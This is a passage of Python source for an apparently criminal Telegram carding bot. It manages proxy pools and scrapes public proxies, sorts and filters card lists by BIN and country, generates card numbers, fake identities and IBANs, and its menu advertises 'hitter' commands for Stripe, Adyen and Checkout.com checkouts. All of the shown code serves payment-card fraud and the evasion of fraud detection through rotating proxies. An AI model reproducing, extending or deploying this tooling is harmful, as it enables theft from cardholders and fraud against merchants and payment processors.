                await message.answer(final_msg, reply_markup=markup)
            else:
                await message.answer(final_msg)

def raw_to_proxy_obj(p_raw: str) -> dict:
    parts = p_raw.split(':')
    if len(parts) == 4:
        return {"raw": p_raw, "server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
    elif len(parts) == 2:
        return {"raw": p_raw, "server": f"http://{parts[0]}:{parts[1]}"}
    return {"raw": p_raw, "server": f"http://{p_raw}"}

@dp.callback_query(F.data == "add_strong_only")
async def process_add_strong_only(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    cache = getattr(bot, 'pasted_proxies_cache', {}).get(user_id, {})
    premium_raws = cache.get('premium', [])
    
    if not premium_raws:
        await callback.answer("No strong proxies found in cache or session expired.", show_alert=True)
        return

    pool = list(await ProxyManager.get_user_proxies(user_id))
    existing_raws = {p['raw'] for p in pool}
    new_added = 0
    for p_raw in premium_raws:
        if p_raw not in existing_raws:
            existing_raws.add(p_raw)
            pool.append(raw_to_proxy_obj(p_raw))
            new_added += 1

    await ProxyManager.save_user_proxies(user_id, pool)

    if LOG_GROUP_ID:
        try:
            proxies_str = "\n".join([f"<code>• {p}</code>" for p in premium_raws[:30]])
            if len(premium_raws) > 30:
                proxies_str += f"\n...and {len(premium_raws) - 30} more premium proxies"
            msg = f"💎 <b>Saved {new_added} new Premium proxies to pool (Total Pool: {len(pool)})!</b>\n👤 User: {callback.from_user.first_name}\n\n{proxies_str}"
            if len(msg) > 4000:
                msg = f"💎 <b>Saved {new_added} new Premium proxies to pool!</b>\n👤 User: {callback.from_user.first_name}"
            await bot.send_message(LOG_GROUP_ID, msg)
        except Exception:
            pass

    bot.pasted_proxies_cache[user_id] = {}
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(
        f"⚡ <b>Proxy Pool Updated</b>\n"
        f"<code>Added {new_added} new premium proxies. Total Active Pool: {len(pool)}</code>"
    )
    await callback.answer("Premium proxies added!")

@dp.callback_query(F.data == "add_live_all")
async def process_add_live_all(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    cache = getattr(bot, 'pasted_proxies_cache', {}).get(user_id, {})
    live_raws = cache.get('live', [])
    
    if not live_raws:
        await callback.answer("No live proxies found in cache or session expired.", show_alert=True)
        return

    pool = list(await ProxyManager.get_user_proxies(user_id))
    existing_raws = {p['raw'] for p in pool}
    new_added = 0
    for p_raw in live_raws:
        if p_raw not in existing_raws:
            existing_raws.add(p_raw)
            pool.append(raw_to_proxy_obj(p_raw))
            new_added += 1

    await ProxyManager.save_user_proxies(user_id, pool)

    if LOG_GROUP_ID:
        try:
            proxies_str = "\n".join([f"<code>• {p}</code>" for p in live_raws[:30]])
            if len(live_raws) > 30:
                proxies_str += f"\n...and {len(live_raws) - 30} more proxies"
            msg = f"📥 <b>Saved {new_added} new live proxies to pool (Total Pool: {len(pool)})!</b>\n👤 User: {callback.from_user.first_name}\n\n{proxies_str}"
            if len(msg) > 4000:
                msg = f"📥 <b>Saved {new_added} new live proxies to pool!</b>\n👤 User: {callback.from_user.first_name}"
            await bot.send_message(LOG_GROUP_ID, msg)
        except Exception:
            pass

    bot.pasted_proxies_cache[user_id] = {}
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(
        f"⚡ <b>Proxy Pool Updated</b>\n"
        f"<code>Added {new_added} new proxies to active pool. Total Pool: {len(pool)}</code>"
    )
    await callback.answer("Live proxies added!")

@dp.callback_query(F.data == "rm_weak_proxies")
async def process_rm_weak(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    weak_proxies = getattr(bot, 'weak_proxies_cache', {}).get(user_id, [])
    
    if not weak_proxies:
        await callback.answer("No weak proxies found or session expired.", show_alert=True)
        return
        
    pool = await ProxyManager.get_user_proxies(user_id)
    new_pool = [p for p in pool if p['raw'] not in weak_proxies]
    removed = len(pool) - len(new_pool)
    
    if removed > 0:
        await ProxyManager.save_user_proxies(user_id, new_pool)
        
    bot.weak_proxies_cache[user_id] = []
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(f"🗑 <b>Removed {removed} weak Datacenter/VPN proxies!</b>\nYour pool is now clean.")
    await callback.answer("Proxies removed successfully!")


@dp.message(Command("getproxy", "scrapeproxy"))
async def getproxy_command(message: types.Message):
    user_id = message.from_user.id
    if not OWNER_ID or str(user_id) != str(OWNER_ID):
        await message.reply("❌ <b>Unauthorized Command</b>\n<code>The /getproxy command is restricted to the bot owner.</code>")
        return
        
    # Parse target count limit e.g. /getproxy 10 (default 10, max 50)
    command_parts = message.text.split(maxsplit=1)
    target_limit = 10
    if len(command_parts) > 1 and command_parts[1].strip().isdigit():
        target_limit = min(max(int(command_parts[1].strip()), 1), 50)
        
    status_msg = await message.answer(
        f"⚡ <b>ATOZ Proxy Scraper & Checker</b>\n"
        f"<code>Querying 20+ public repositories for active live proxies...</code>"
    )
    
    async def update_cb(text: str):
        try:
            await status_msg.edit_text(text)
        except Exception:
            pass
            
    try:
        from proxy_scraper import fetch_and_test_live_proxies
        live_proxies = await fetch_and_test_live_proxies(target_limit=target_limit, timeout=4.0, update_cb=update_cb)
    except Exception as e:
        await status_msg.edit_text(f"❌ <b>Proxy Scrape Error</b>\n<code>{str(e)}</code>")
        return
        
    if not live_proxies:
        await status_msg.edit_text(
            "⚠️ <b>Proxy Scrape Complete</b>\n"
            "<code>No responsive public proxies found. Try running again in a few moments.</code>"
        )
        return
        
    if not hasattr(bot, 'getproxy_cache'):
        bot.getproxy_cache = {}
        
    bot.getproxy_cache[user_id] = live_proxies
    
    lines = [f"🌐 <b>LIVE PROXIES FOUND ({len(live_proxies)})</b>\n"]
    for p in live_proxies:
        lines.append(f"{p['flag']} <code>{p['raw']}</code> | {p['country']} | ⚡ <b>{p['ping_ms']}ms</b>")
        
    lines.append("\n👉 <i>Click below to save these active proxies to your pool:</i>")
    msg_text = "\n".join(lines)
    
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"➕ ADD ALL SCRAPED ({len(live_proxies)}) TO POOL", callback_data="add_scraped_all")],
        [InlineKeyboardButton(text="⚡ ADD FAST IPS ONLY (< 2S)", callback_data="add_scraped_fast")]
    ])
    
    try:
        await status_msg.edit_text(msg_text, reply_markup=markup)
    except Exception:
        await message.answer(msg_text, reply_markup=markup)


@dp.callback_query(F.data == "add_scraped_all")
async def process_add_scraped_all(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    cache = getattr(bot, 'getproxy_cache', {}).get(user_id, [])
    if not cache:
        await callback.answer("Scraped proxy session expired. Run /getproxy again.", show_alert=True)
        return
        
    pool = await ProxyManager.get_user_proxies(user_id)
    existing_raws = {p['raw'] for p in pool}
    added = 0
    for p in cache:
        raw_p = p['raw']
        if raw_p not in existing_raws:
            parts = raw_p.split(':')
            pool.append({"raw": raw_p, "server": f"http://{parts[0]}:{parts[1]}"})
            added += 1
            
    if added > 0:
        await ProxyManager.save_user_proxies(user_id, pool)
        
    bot.getproxy_cache[user_id] = []
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(f"✅ <b>Added {added} live scraped proxies to your active pool!</b>")
    await callback.answer(f"Added {added} proxies!")


@dp.callback_query(F.data == "add_scraped_fast")
async def process_add_scraped_fast(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    cache = getattr(bot, 'getproxy_cache', {}).get(user_id, [])
    if not cache:
        await callback.answer("Scraped proxy session expired. Run /getproxy again.", show_alert=True)
        return
        
    fast_proxies = [p for p in cache if p['ping_ms'] <= 2000]
    if not fast_proxies:
        await callback.answer("No fast proxies (< 2s) in current batch.", show_alert=True)
        return
        
    pool = await ProxyManager.get_user_proxies(user_id)
    existing_raws = {p['raw'] for p in pool}
    added = 0
    for p in fast_proxies:
        raw_p = p['raw']
        if raw_p not in existing_raws:
            parts = raw_p.split(':')
            pool.append({"raw": raw_p, "server": f"http://{parts[0]}:{parts[1]}"})
            added += 1
            
    if added > 0:
        await ProxyManager.save_user_proxies(user_id, pool)
        
    bot.getproxy_cache[user_id] = []
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(f"⚡ <b>Added {added} fast proxies (< 2s) to your active pool!</b>")
    await callback.answer(f"Added {added} fast proxies!")


# ==================== FILE TOOLS & CATEGORIZED MENUS ====================

async def get_replied_txt_file(message: types.Message) -> Optional[Tuple[str, str]]:
    """Helper to check if user replied to a .txt document. Returns (filename, text_content) or None."""
    reply = message.reply_to_message
    if not reply or not reply.document:
        await message.reply(
            "⚠️ <b>Reply Required</b>\n"
            "<code>Reply to a .txt file before using this command.</code>"
        )
        return None
        
    doc = reply.document
    filename = doc.file_name or "document.txt"
    if not filename.lower().endswith(".txt"):
        await message.reply(
            "⚠️ <b>Invalid File Type</b>\n"
            "<code>Only .txt documents are supported. Please reply to a valid .txt file.</code>"
        )
        return None
        
    try:
        file_info = await bot.get_file(doc.file_id)
        downloaded = await bot.download_file(file_info.file_path)
        content = downloaded.read().decode('utf-8', errors='ignore')
        return filename, content
    except Exception as e:
        await message.reply(f"❌ <b>File Download Error</b>\n<code>{str(e)}</code>")
        return None

# --- FILE COMMANDS ---

@dp.message(Command("split"))
async def split_command(message: types.Message):
    res = await get_replied_txt_file(message)
    if not res: return
    filename, content = res
    
    args = message.text.split(maxsplit=1)
    n_parts = 2
    if len(args) > 1 and args[1].strip().isdigit():
        n_parts = int(args[1].strip())
        
    parts = split_text_n_parts(content, n_parts)
    if not parts:
        await message.reply("⚠️ File is empty.")
        return
        
    status_msg = await message.reply(f"✂️ <b>Splitting file into {len(parts)} parts...</b>")
    
    temp_dir = os.path.join(os.path.dirname(__file__), 'temp')
    os.makedirs(temp_dir, exist_ok=True)
    
    base_name = os.path.splitext(filename)[0]
    for idx, part_text in enumerate(parts, 1):
        part_path = os.path.join(temp_dir, f"{base_name}_part{idx}.txt")
        with open(part_path, 'w', encoding='utf-8') as f:
            f.write(part_text)
        line_cnt = len(part_text.splitlines())
        await message.reply_document(
            document=FSInputFile(part_path, filename=f"{base_name}_part{idx}.txt"),
            caption=f"✂️ <b>Part {idx}/{len(parts)}</b> ({line_cnt} lines)"
        )
        try: os.remove(part_path)
        except: pass
        
    try: await status_msg.delete()
    except: pass

@dp.message(Command("clean"))
async def clean_command(message: types.Message):
    res = await get_replied_txt_file(message)
    if not res: return
    filename, content = res
    
    status_msg = await message.reply("🧹 <b>Cleaning & sorting cards...</b>")
    
    clean_text, stats = clean_and_sort_cards_text(content)
    if not clean_text:
        await status_msg.edit_text("⚠️ <b>Clean Result</b>\n<code>No valid cards found in file.</code>")
        return
        
    import uuid
    temp_dir = os.path.join(os.path.dirname(__file__), 'temp')
    os.makedirs(temp_dir, exist_ok=True)
    clean_path = os.path.join(temp_dir, f"clean_{message.from_user.id}_{uuid.uuid4().hex[:6]}_{filename}")
    
    with open(clean_path, 'w', encoding='utf-8') as f:
        f.write(clean_text)
        
    brand_summary = []
    for brand, cnt in stats['brand_counts'].items():
        if cnt > 0:
            brand_summary.append(f"• <b>{brand}:</b> {cnt}")
    brand_str = "\n".join(brand_summary) if brand_summary else "None"
    
    caption = (
        f"🧹 <b>Card List Cleaned & Sorted</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📥 <b>Input Lines:</b> {stats['total_input']}\n"
        f"✅ <b>Clean Valid:</b> {stats['valid_total']}\n"
        f"🗑 <b>Removed Expired/Invalid:</b> {stats['invalid_count']}\n"
        f"♻️ <b>Removed Duplicates:</b> {stats['duplicate_count']}\n\n"
        f"📊 <b>Sorted Brand Breakdown:</b>\n{brand_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await message.reply_document(
        document=FSInputFile(clean_path, filename=f"clean_{filename}"),
        caption=caption
    )
    try: os.remove(clean_path)
    except: pass
    try: await status_msg.delete()
    except: pass

@dp.message(Command("find"))
async def find_command(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("⚠️ <b>Usage:</b> <code>/find <BIN_prefix></code> (e.g. <code>/find 401704</code>)")
        return
    bin_prefix = args[1].strip()
    
    res = await get_replied_txt_file(message)
    if not res: return
    filename, content = res
    
    found_text, count = filter_by_bin_prefix(content, bin_prefix)
    if count == 0:
        await message.reply(f"🔍 <b>No matches found</b> for BIN prefix <code>{bin_prefix}</code>.")
        return
        
    import uuid
    temp_dir = os.path.join(os.path.dirname(__file__), 'temp')
    os.makedirs(temp_dir, exist_ok=True)
    out_path = os.path.join(temp_dir, f"found_{message.from_user.id}_{uuid.uuid4().hex[:6]}_{bin_prefix}.txt")
    
    with open(out_path, 'w', encoding='utf-8') as f:
        f.write(found_text)
        
    await message.reply_document(
        document=FSInputFile(out_path, filename=f"found_{bin_prefix}.txt"),
        caption=f"🔍 <b>BIN Search Result:</b> <code>{bin_prefix}</code>\nTotal matches: <b>{count} lines</b>"
    )
    try: os.remove(out_path)
    except: pass

@dp.message(Command("country"))
async def country_command(message: types.Message):
    res = await get_replied_txt_file(message)
    if not res: return
    filename, content = res
    
    status_msg = await message.reply("🌍 <b>Grouping cards by country...</b>")
    
    country_groups, country_meta = await group_text_by_country(content)
    if not country_groups:
        await status_msg.edit_text("⚠️ No cards found to group by country.")
        return
        
    if not hasattr(bot, 'country_cache'):
        bot.country_cache = {}
    bot.country_cache[message.from_user.id] = {
        'groups': country_groups,
        'meta': country_meta,
        'index_map': {idx+1: c_name for idx, c_name in enumerate(country_groups.keys())}
    }
    
    lines = ["🌍 <b>Country Breakdown</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
    for idx, (c_name, cards) in enumerate(country_groups.items(), 1):
        meta = country_meta.get(c_name, {})
        flag = meta.get('flag', '🌐')
        code = meta.get('code', 'UNK')
        lines.append(f"<b>{idx}.</b> {flag} <b>{c_name}</b> (<code>{code}</code>): <b>{len(cards)} cards</b>")
        
    lines.append("\n👉 <i>Use <code>/pick <number_or_code></code> (e.g. <code>/pick 1</code> or <code>/pick US</code>) to download cards.</i>")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    
    await status_msg.edit_text("\n".join(lines))

@dp.message(Command("pick"))
async def pick_command(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("⚠️ <b>Usage:</b> <code>/pick <number_or_code></code> (e.g. <code>/pick 1</code> or <code>/pick US</code>)")
        return
    target = args[1].strip()
    
    cache = getattr(bot, 'country_cache', {}).get(user_id)
    
    if not cache and message.reply_to_message:
        res = await get_replied_txt_file(message)
        if res:
            _, content = res
            status_msg = await message.reply("🌍 <b>Grouping cards by country...</b>")
            groups, meta = await group_text_by_country(content)
            cache = {
                'groups': groups,
                'meta': meta,
                'index_map': {idx+1: c_name for idx, c_name in enumerate(groups.keys())}
            }
            bot.country_cache[user_id] = cache
            try: await status_msg.delete()
            except: pass

    if not cache:
        await message.reply("⚠️ <b>No active country breakdown</b>. Run <code>/country</code> first or reply to a .txt file with <code>/pick 1</code>.")
        return
        
    groups = cache['groups']
    index_map = cache['index_map']
    
    chosen_country = None
    if target.isdigit() and int(target) in index_map:
        chosen_country = index_map[int(target)]
    else:
        target_upper = target.upper()
        for c_name, meta in cache['meta'].items():
            if meta.get('code') == target_upper or c_name.upper() == target_upper:
                chosen_country = c_name
                break
                
    if not chosen_country or chosen_country not in groups:
        await message.reply(f"⚠️ Country index or code <code>{target}</code> not found.")
        return
        
    card_lines = groups[chosen_country]
    meta = cache['meta'].get(chosen_country, {})
    flag = meta.get('flag', '🌐')
    code = meta.get('code', 'UNK')
    
    import uuid
    temp_dir = os.path.join(os.path.dirname(__file__), 'temp')
    os.makedirs(temp_dir, exist_ok=True)
    out_path = os.path.join(temp_dir, f"cards_{user_id}_{uuid.uuid4().hex[:6]}_{code}.txt")
    
    with open(out_path, 'w', encoding='utf-8') as f:
        f.write("\n".join(card_lines))
        
    await message.reply_document(
        document=FSInputFile(out_path, filename=f"cards_{code}.txt"),
        caption=f"📦 {flag} <b>Extracted Cards for {chosen_country}</b> (<code>{code}</code>)\nTotal: <b>{len(card_lines)} cards</b>"
    )
    try: os.remove(out_path)
    except: pass

@dp.message(Command("addfile"))
async def addfile_command(message: types.Message):
    user_id = message.from_user.id
    res = await get_replied_txt_file(message)
    if not res: return
    filename, content = res
    
    if not hasattr(bot, 'merge_queues'):
        bot.merge_queues = {}
    if user_id not in bot.merge_queues:
        bot.merge_queues[user_id] = []
        
    lines = [line.strip() for line in content.splitlines() if line.strip()]
    bot.merge_queues[user_id].append({'filename': filename, 'lines': lines})
    
    q = bot.merge_queues[user_id]
    total_lines = sum(len(f['lines']) for f in q)
    
    await message.reply(
        f"🔗 <b>Added file to Merge Queue!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 File: <code>{filename}</code> ({len(lines)} lines)\n"
        f"📦 Queue Total: <b>{len(q)} files</b> ({total_lines} total lines)\n\n"
        f"👉 Use <code>/merge</code> to join all queued files or <code>/clearqueue</code> to reset."
    )

@dp.message(Command("merge"))
async def merge_command(message: types.Message):
    user_id = message.from_user.id
    queue = getattr(bot, 'merge_queues', {}).get(user_id, [])
    
    if message.reply_to_message and message.reply_to_message.document:
        res = await get_replied_txt_file(message)
        if res:
            fn, cnt = res
            lines = [line.strip() for line in cnt.splitlines() if line.strip()]
            if user_id not in getattr(bot, 'merge_queues', {}):
                bot.merge_queues[user_id] = []
            bot.merge_queues[user_id].append({'filename': fn, 'lines': lines})
            queue = bot.merge_queues[user_id]
            
    if not queue:
        await message.reply(
            "⚠️ <b>Merge Queue is Empty</b>\n"
            "<code>Use /addfile by replying to .txt files first, then run /merge.</code>"
        )
        return
        
    all_lines = []
    for f_item in queue:
        all_lines.extend(f_item['lines'])
        
    seen = set()
    clean_merged = []
    for line in all_lines:
        if line not in seen:
            seen.add(line)
            clean_merged.append(line)
            
    merged_text = "\n".join(clean_merged)
    
    import uuid
    temp_dir = os.path.join(os.path.dirname(__file__), 'temp')
    os.makedirs(temp_dir, exist_ok=True)
    out_path = os.path.join(temp_dir, f"merged_output_{user_id}_{uuid.uuid4().hex[:6]}.txt")
    
    with open(out_path, 'w', encoding='utf-8') as f:
        f.write(merged_text)
        
    file_names_str = ", ".join([f['filename'] for f in queue])
    caption = (
        f"🔗 <b>Files Merged Successfully!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📂 Merged Files ({len(queue)}): <code>{file_names_str[:100]}</code>\n"
        f"📊 Total Raw Lines: {len(all_lines)}\n"
        f"✅ Unique Clean Lines: <b>{len(clean_merged)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await message.reply_document(
        document=FSInputFile(out_path, filename="merged_output.txt"),
        caption=caption
    )
    bot.merge_queues[user_id] = []
    try: os.remove(out_path)
    except: pass

@dp.message(Command("clearqueue"))
async def clearqueue_command(message: types.Message):
    user_id = message.from_user.id
    if hasattr(bot, 'merge_queues'):
        bot.merge_queues[user_id] = []
    await message.reply("🗑 <b>Merge queue cleared.</b>")


# ==================== CC, IDENTITY & IBAN GENERATORS ====================

@dp.message(Command("gen", "bin"))
async def gen_cards_command(message: types.Message):
    parts = message.text.strip().split()
    if len(parts) < 2:
        await message.reply(
            "<b>Usage Error</b>\n"
            "<code>Provide BIN pattern. Example:\n"
            "/gen 453590 [count=10]\n"
            "OR\n"
            "/gen 453590xxxxxxxxxx|05|28|xxx 1000</code>",
            parse_mode="html"
        )
        return
        
    bin_pat = parts[1].strip()
    count = 10
    if len(parts) >= 3 and parts[2].isdigit():
        count = min(int(parts[2]), 10000)
        
    try:
        from generators import generate_bin_cards
        from aiogram.types import FSInputFile
        
        cards = generate_bin_cards(bin_pat, count)
        
        if count <= 20:
            cards_str = "\n".join([f"<code>{c}</code>" for c in cards])
            res = (
                f"💳 <b>BIN Cards Generated</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 <b>BIN Pattern:</b> <code>{bin_pat}</code>\n"
                f"📊 <b>Amount:</b> {len(cards)} Cards\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{cards_str}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )
            await message.reply(res, parse_mode="html")
        else:
            # Save clean CC lines to txt file
            temp_dir = os.path.join(os.path.dirname(__file__), 'temp')
            os.makedirs(temp_dir, exist_ok=True)
            clean_bin_name = re.sub(r'[^0-9]', '', bin_pat)[:8] or "gen"
            out_filename = f"generated_cards_{clean_bin_name}_{len(cards)}.txt"
            out_path = os.path.join(temp_dir, out_filename)
            
            with open(out_path, 'w', encoding='utf-8') as f:
                f.write("\n".join(cards) + "\n")
                
            caption = (
                f"💳 <b>BIN Cards Generated!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 <b>BIN Pattern:</b> <code>{bin_pat}</code>\n"
                f"📊 <b>Total Cards:</b> <b>{len(cards)}</b>\n"
                f"📂 <b>Format:</b> Clean <code>cc|mm|yy|cvc</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )
            
            await message.reply_document(
                document=FSInputFile(out_path, filename=out_filename),
                caption=caption,
                parse_mode="html"
            )
            try:
                os.remove(out_path)
            except Exception:
                pass
    except Exception as e:
        await message.reply(f"<b>Error generating CCs:</b> <code>{e}</code>", parse_mode="html")


@dp.message(Command("fake"))
async def fake_identity_command(message: types.Message):
    parts = message.text.strip().split(maxsplit=1)
    country_q = parts[1].strip() if len(parts) > 1 else "United States"
    try:
        from generators import generate_fake_identity
        identity = generate_fake_identity(country_q)
        
        res = (
            f"👤 <b>Generated Fake Identity</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {identity.get('name', 'N/A')}\n"
            f"🚻 <b>Gender:</b> {identity.get('gender', 'N/A')}\n"
            f"🎂 <b>DOB:</b> {identity.get('birthday', 'N/A')}\n"
            f"📧 <b>Email:</b> <code>{identity.get('email', 'N/A')}</code>\n"
            f"📞 <b>Phone:</b> <code>{identity.get('phone', 'N/A')}</code>\n"
            f"🏠 <b>Address:</b> <code>{identity.get('street', 'N/A')}</code>\n"
            f"🏙️ <b>City/State:</b> {identity.get('city', 'N/A')}, {identity.get('state', 'N/A')}\n"
            f"📮 <b>ZIP:</b> <code>{identity.get('zip', 'N/A')}</code>\n"
            f"{identity.get('flag', '🌐')} <b>Country:</b> {identity.get('country', country_q)}\n"
            f"🆔 <b>{identity.get('id_name', 'ID')}:</b> <code>{identity.get('id_val', 'N/A')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        await message.reply(res, parse_mode="html")
    except Exception as e:
        await message.reply(f"<b>Error:</b> <code>{e}</code>", parse_mode="html")


@dp.message(Command("iban"))
async def iban_command(message: types.Message):
    parts = message.text.strip().split(maxsplit=1)
    country_code = (parts[1].strip().upper() if len(parts) > 1 else "DE")[:2]
    try:
        from generators import generate_valid_iban
        iban = generate_valid_iban(country_code)
        
        res = (
            f"🏦 <b>Generated Valid IBAN</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{iban['flag']} <b>Country:</b> {iban['country']} ({country_code})\n"
            f"💳 <b>IBAN:</b> <code>{iban['iban']}</code>\n"
            f"🏦 <b>Bank Name:</b> {iban['bank_name']}\n"
            f"🔢 <b>Bank Code (BLZ):</b> <code>{iban['bank_code']}</code>\n"
            f"⚡ <b>BIC/SWIFT:</b> <code>{iban['bic']}</code>\n"
            f"🆔 <b>Account No:</b> <code>{iban['account_no']}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        await message.reply(res, parse_mode="html")
    except Exception as e:
        await message.reply(f"<b>Error generating IBAN:</b> <code>{e}</code>", parse_mode="html")


@dp.message(Command("ibancountry"))
async def ibancountry_command(message: types.Message):
    try:
        from generators import IBAN_COUNTRIES
        regions = {}
        for code, info in IBAN_COUNTRIES.items():
            r = info.get("region", "Europe")
            if r not in regions:
                regions[r] = []
            regions[r].append(f"{info['flag']} <code>{code}</code> ({info['name']})")
            
        lines = [
            "🌐 <b>SUPPORTED IBAN COUNTRIES (56)</b>",
            "━━━━━━━━━━━━━━━━━━━━━━\n"
        ]
        for region, items in regions.items():
            lines.append(f"📌 <b>{region}:</b>")
            lines.append(", ".join(items) + "\n")
            
        lines.append("👉 <i>Usage: <code>/iban [CC]</code> (e.g. <code>/iban DE</code>, <code>/iban FR</code>, <code>/iban GB</code>)</i>")
        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        await message.reply("\n".join(lines), parse_mode="html")
    except Exception as e:
        await message.reply(f"<b>Error:</b> <code>{e}</code>", parse_mode="html")


# --- CATEGORIZED MENU CALLBACKS ---

@dp.callback_query(F.data.in_({"show_commands", "menu_main"}))
async def process_show_commands(callback: types.CallbackQuery):
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="𝙃𝙄𝙏𝙏𝙀𝙍", callback_data="menu_hitter"),
            InlineKeyboardButton(text="𝙏𝙊𝙊𝙇𝙎", callback_data="menu_tools")
        ]
    ])
    commands_text = (
        "<b>COMMANDS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<i>Select a command category below to view details:</i>"
    )
    try:
        await callback.message.edit_text(commands_text, reply_markup=markup)
    except Exception:
        await callback.message.answer(commands_text, reply_markup=markup)
    await callback.answer()

@dp.callback_query(F.data == "menu_hitter")
async def process_menu_hitter(callback: types.CallbackQuery):
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="𝘽𝘼𝘾𝙆", callback_data="menu_main")]
    ])
    hitter_text = (
        "<b><i>Stripe Checkout Hitter</i></b>\n"
        "<code>/hit [url] [cc|mm|yy|cvv]</code>\n\n"
        "<b><i>Adyen Checkout Hitter</i></b>\n"
        "<code>/hitad [url] [cc|mm|yy|cvv]</code>\n\n"
        "<b><i>Adyen Checkout CCN Hitter</i></b>\n"
        "<code>/hitad1 [url] [card_number]</code>\n\n"
        "<b><i>Checkout.com Hitter</i></b>\n"
        "<code>/hitck [url] [cc|mm|yy|cvv]</code>"
    )
    await callback.message.edit_text(hitter_text, reply_markup=markup)
    await callback.answer()

@dp.callback_query(F.data.in_({"menu_tools", "tools_p1"}))
async def process_menu_tools_p1(callback: types.CallbackQuery):
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="𝙉𝙀𝙓𝙏", callback_data="tools_p2"),
            InlineKeyboardButton(text="𝘽𝘼𝘾𝙆", callback_data="menu_main"),
            InlineKeyboardButton(text="𝘾𝙇𝙊𝙎𝙀", callback_data="menu_close")
        ]
    ])
    text = (
        "<b><i>BIN Generator</i></b>\n"
        "<code>/bin [bin_pattern] [count]</code>\n\n"
        "<b><i>Fake Identity Generator</i></b>\n"
        "<code>/fake [country]</code>\n\n"
        "<b><i>IBAN Generator</i></b>\n"
        "<code>/iban [country_code]</code>\n\n"
        "<b><i>IBAN Country Codes</i></b>\n"
        "<code>/ibancountry</code>"
    )
    await callback.message.edit_text(text, reply_markup=markup)
    await callback.answer()

@dp.callback_query(F.data == "tools_p2")
async def process_menu_tools_p2(callback: types.CallbackQuery):
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="𝙉𝙀𝙓𝙏", callback_data="tools_p3"),
            InlineKeyboardButton(text="𝘽𝘼𝘾𝙆", callback_data="tools_p1"),
            InlineKeyboardButton(text="𝘾𝙇𝙊𝙎𝙀", callback_data="menu_close")
        ]
    ])
    text = (
        "<b><i>Add Proxy</i></b>\n"
        "<code>/proxy [ip:port / user:pass@ip:port]</code>\n\n"
        "<b><i>Check Proxies</i></b>\n"
        "<code>/checkproxy</code>\n\n"
        "<b><i>Proxy Status</i></b>\n"
        "<code>/proxystatus</code>\n\n"
        "<b><i>Clear Proxies</i></b>\n"
        "<code>/offproxy</code>"
    )
    await callback.message.edit_text(text, reply_markup=markup)
    await callback.answer()

@dp.callback_query(F.data == "tools_p3")
async def process_menu_tools_p3(callback: types.CallbackQuery):
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="𝙉𝙀𝙓𝙏", callback_data="tools_p4"),
            InlineKeyboardButton(text="𝘽𝘼𝘾𝙆", callback_data="tools_p2"),
            InlineKeyboardButton(text="𝘾𝙇𝙊𝙎𝙀", callback_data="menu_close")
        ]
    ])
    text = (
        "<b><i>Split File</i></b>\n"
        "<code>/split [N]</code>\n\n"
        "<b><i>Clean Combo File</i></b>\n"
        "<code>/clean</code>\n\n"
        "<b><i>Find BIN Lines</i></b>\n"
        "<code>/find [BIN]</code>\n\n"
        "<b><i>Group By Country</i></b>\n"
        "<code>/country</code>"
    )
    await callback.message.edit_text(text, reply_markup=markup)
    await callback.answer()

@dp.callback_query(F.data == "tools_p4")
async def process_menu_tools_p4(callback: types.CallbackQuery):
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="𝘽𝘼𝘾𝙆", callback_data="tools_p3"),
            InlineKeyboardButton(text="𝘾𝙇𝙊𝙎𝙀", callback_data="menu_close")
        ]
    ])
    text = (
        "<b><i>Pick Country Lines</i></b>\n"
        "<code>/pick [N]</code>\n\n"
        "<b><i>Add File To Queue</i></b>\n"
